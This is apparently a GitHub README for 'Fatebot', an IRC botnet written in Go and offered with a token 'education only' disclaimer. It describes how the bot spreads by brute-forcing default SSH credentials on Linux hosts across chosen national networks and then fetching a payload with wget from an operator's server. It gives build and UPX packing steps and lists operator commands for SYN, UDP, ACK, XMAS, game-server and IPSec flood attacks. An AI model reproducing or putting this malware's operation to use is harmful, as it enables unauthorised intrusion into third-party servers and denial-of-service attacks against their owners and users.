# Fatebot
This is my first <strong>IRC botnet</strong> for launch Denial of Service attack. Scan target are anything that run linux, open default SSH port, use default username and password. This bot are write in "Go" language. <strong>For education purpose only. Please test it in your lab, i create this for join university in the future not for attack anyone server with out any permission!!!</strong>

<br>Bozer\Bulldozer (old name is R4bin) the author of Fatebot, feel free to do anything with it. read more detail in license.</br>
<br><ins>If you have an issue please understand that some of them i can't answer because it will make me have a trouble with The cyber law.</ins></br>

<img src="assets/FateBot.png" alt="Fatebot" width="400" height="400">

# Infect
The infect function of this bot is scan by default SSH port. Option about scan feature in this bot is scan on USA, CN, KR network or you can do a random scan or even you can add you own mods like russia or india isp mods, all of these it's up to you. This bot will brute-force attack to the target and use <strong>"wget"</strong> for download the payload from FTP server, so... please prepair your FTP server first it's very important for the infect process. <strong>(You can use any option any server type that can host the payload not maintionly to be an FTP server.)</strong>

# Add more network

(1) Create slice of your network.

	Example:
	
		var UK_netList = []string{
			"123.123", // 123.123.0.0/16
			"234.234", // 234.234.0.0/16
		}
	
	# since v0.6.0 will be use only 16bit of the ip range(I'm still confused about subnet mask lol).

(2) Then go down to the "ScanMode" function and add the case of your network and custom the command.
	
	Example:
		
		case modes == "-uk": //custom your command.
			b.Scanner(UK_netList, false) //just config the first argument to your network.
		
<strong>I use shodan to do a static and analysis of scanning like how many of SSH port are open on which isp/org, what is the most used OS, version and etc.</strong>

# Attack
Attack feature will play around with <strong>volumetric</strong> mostly, but also have an <strong>application</strong> too.
All of the attack vectors will be <strong>random source port automatically, min and max of attack size will be 10 - 1450bytes.</strong>


<img src="assets/synflood.png" alt="synflood, dos example">

# Build payload

	chmod +x build.sh
	./build.sh <payload>
	
	#Tip: You can download upx packer to make your payload have a smaller size. It's not help much but it's really useful.
	
	Redhat:
		yum install upx -y && upx -9 bin/<payload>
		
	Debian:
		apt install upx -y && upx -9 bin/<payload>
		
# Requirements
<ul>
	<li>IRC Server</li>
</ul>

<ul><li>IRC Backup Server <strong>(Optional)</strong></li></ul>

<ul>
	<li>IRC Client</li>
</ul>

<ul>
	<li>Payload Hosting Server</li>
</ul>

<ul>
	<li>Go Compiler</li>
</ul>

<ul>
	<li>UPX Packer <strong>(Optional)</strong></li>
</ul>

<ul>
	<li>Code\Text Editor</li>
</ul>

# IRC Commands
	
	ATTACK VECTORS:
	
		?udp <srcIP> <dstIP> <port> <size>		Just a normal UDP Flood attack.
		?syn <srcIP> <dstIP> <port> <size>		Just a normal SYN Flood attack.	
		?ack <srcIP> <dstIP> <port> <size>		Just a normal ACK Flood attack.
		?fin <srcIP> <dstIP> <port> <size>		Flood TCP FIN packets to request close connection when target server are blocking a syn packet.
		?rst <srcIP> <dstIP> <port> <size>		Flood TCP RST packets to broke a TCP connection between client and target server.
		?sap <srcIP> <dstIP> <port> <size>		Flood by using TCP SYN+ACK Flags to the target server.
		?xmas <srcIP> <dstIP> <port> <size>		Flood TCP packets by using all of TCP Flags to target server.
		?vse <srcIP> <dstIP>				Flood TSource Engine Query request to the target game server that used valve source engine.
		?fms <srcIP> <dstIP>				Flood query payload to a FiveM game server(They use to host GTAV i guess. i'm only playing "Hell let loose" for now, lol).
		?ipsec <srcIP> <dstIP>				Flood payload to overwhelm system resources of VPN service and make IPSec VPN connections being affected.
	
	SCANNER:
	
		?scan <modes> <server>                  Scan SSH port on the network, Brute-Force attack to the target and install the payload by "wget".
	
			-cn		Scan on china network.
			-usa		Scan on the united state of america network.
			-kr		Scan on south korea network.
			-r		Scan with random ip.	
		
	?info				Get bot system information, for bot analysis.
	?kill				Bot self-close.
	?stopddos 			Stop ddos attacking.
	?stopscan			Stop scanning.
